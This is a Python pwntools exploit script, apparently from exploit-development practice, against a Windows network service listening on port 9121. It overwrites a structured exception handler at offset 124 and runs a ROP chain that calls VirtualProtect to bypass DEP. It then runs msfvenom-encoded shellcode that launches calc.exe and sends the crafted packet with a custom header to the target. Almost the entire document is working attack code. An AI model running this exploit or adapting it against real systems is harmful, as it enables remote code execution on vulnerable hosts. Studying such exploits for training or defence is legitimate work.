#!/usr/bin/python3
from pwn import remote, p32, asm

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 2
Start of chain (TEB FS:[0]) : 0x01c4fe0c
Address     Next SEH    Handler
-------     --------    -------
0x01c4ff44  0x65413165  0x33654132  (record smashed at offset 124)
"""

offset = 124
junk = b"A" * offset

nseh = b"B" * 4
seh = p32(0x1011b250) # add esp, 0x72c; ret 0x8;

rop  = b""
rop += p32(0x10010122) * 36 # ret;
rop += p32(0x1001bc5b)      # pop ecx; ret;
rop += p32(0x1020c03b)      # Writable
rop += p32(0x1002f729)      # pop eax; ret;
rop += p32(0xffffffc0)      # 0x0 - 0x40
rop += p32(0x1005a3e6)      # neg eax; ret;
rop += p32(0x100cb4d4)      # xchg edx, eax; ret;
rop += p32(0x1002f729)      # pop eax; ret;
rop += p32(0xffffcfff)      # 0x0 - 0x3001
rop += p32(0x1005a3e6)      # neg eax; ret;
rop += p32(0x1001181d)      # dec eax; ret;
rop += p32(0x100cdc7a)      # xchg ebp, eax; ret;
rop += p32(0x1002f729)      # pop eax; ret;
rop += p32(0x101680aC)      # ReadFile() [- 0x3000 = VirtualProtect()]
rop += p32(0x1014dc4c)      # mov eax, dword ptr [eax]; ret;
rop += p32(0x1014c168)      # sub eax, ebp; pop esi; pop ebp; pop ebx; ret;
rop += p32(0x101510b3)      # jmp eax;
rop += p32(0x1005e9f5)      # pop ebp; ret;
rop += p32(0xffffffff)      # 0x0 - 0x1
rop += p32(0x10125f85)      # xchg edi, eax; ret;
rop += p32(0x1002f729)      # pop eax; ret;
rop += p32(0xfffffffe)      # 0x0 - 0x2
rop += p32(0x1005a3e6)      # neg eax; ret;
rop += p32(0x100c9be1)      # add ebx, eax; mov eax, 1; ret;
rop += p32(0x10125f85)      # xchg edi, eax; ret;
rop += p32(0x10064a0f)      # pop edi; ret;
rop += p32(0x10010122)      # ret;
rop += p32(0x10109ed2)      # pushad; ret;
rop += p32(0x10090c83)      # jmp esp;

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\xf4\xec\x83\xc2\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x08\x04\x01\xc2\xf0\xd5\x66\x4a"
shellcode += b"\x15\xe4\xa6\x28\x5e\x57\x17\x3a\x32\x54\xdc"
shellcode += b"\x6e\xa6\xef\x90\xa6\xc9\x58\x1e\x91\xe4\x59"
shellcode += b"\x33\xe1\x67\xda\x4e\x36\x47\xe3\x80\x4b\x86"
shellcode += b"\x24\xfc\xa6\xda\xfd\x8a\x15\xca\x8a\xc7\xa5"
shellcode += b"\x61\xc0\xc6\xad\x96\x91\xe9\x9c\x09\xa9\xb3"
shellcode += b"\x3e\xa8\x7e\xc8\x76\xb2\x63\xf5\xc1\x49\x57"
shellcode += b"\x81\xd3\x9b\xa9\x6a\x7f\xe2\x05\x99\x81\x23"
shellcode += b"\xa1\x42\xf4\x5d\xd1\xff\x0f\x9a\xab\xdb\x9a"
shellcode += b"\x38\x0b\xaf\x3d\xe4\xad\x7c\xdb\x6f\xa1\xc9"
shellcode += b"\xaf\x37\xa6\xcc\x7c\x4c\xd2\x45\x83\x82\x52"
shellcode += b"\x1d\xa0\x06\x3e\xc5\xc9\x1f\x9a\xa8\xf6\x7f"
shellcode += b"\x45\x14\x53\xf4\x68\x41\xee\x57\xe7\x94\x7c"
shellcode += b"\xe2\x45\x96\x7e\xec\xf9\xff\x4f\x67\x96\x78"
shellcode += b"\x50\xa2\xd2\x77\x1a\xee\x73\x10\xc3\x7b\xc6"
shellcode += b"\x7d\xf4\x56\x05\x78\x77\x52\xf6\x7f\x67\x17"
shellcode += b"\xf3\xc4\x2f\xc4\x89\x55\xda\xea\x3e\x55\xcf"
shellcode += b"\x89\xa1\xc5\x93\x63\x47\x6e\x31\x7b\x87\x8e"
shellcode += b"\xb9\x7b\x87\x8e\xb9"

payload  = b""
payload += junk
payload += nseh + seh
payload += rop
payload += shellcode
payload += b"B" * (1000 - len(payload))

header  = b""
header += p32(0xabba1975)
header += p32(0x3)
header += p32(0x1)
header += p32(len(payload))
header += p32(len(payload))
header += p32(payload[-1])

content = header + payload

shell = remote("Windows", 9121)
shell.sendline(content)
